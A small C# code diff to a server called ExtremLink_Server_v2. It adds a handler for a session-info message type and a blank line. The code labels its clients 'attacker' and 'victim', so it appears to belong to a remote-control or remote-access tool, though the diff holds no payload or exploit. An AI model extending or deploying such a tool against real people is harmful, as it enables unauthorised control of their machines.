@@ -227,6 +227,9 @@ namespace ExtremLink_Server_v2.Classes
                     case "!":
                         this.HandleUsersDatabaseMessages(data, TypeOfClient.victim);
                         break;
+                    case "📹🕑":
+                        this.HandleSessionInfoMessage(data);
+                        break;
                 }
             }
         }
@@ -498,6 +501,7 @@ namespace ExtremLink_Server_v2.Classes
                             this.attacker.SendTCPMessageToClient("📹🕑", sessionPropertiesStr);
                             break;
                         case "Victim":
+
                             sessionPropertiesStr = this.FromSessionIlistToStringJson(this.UsersSessionsProperties(this.victim.User.UserName));
                             this.victim.SendTCPMessageToClient("📹🕑", sessionPropertiesStr);
                             break;
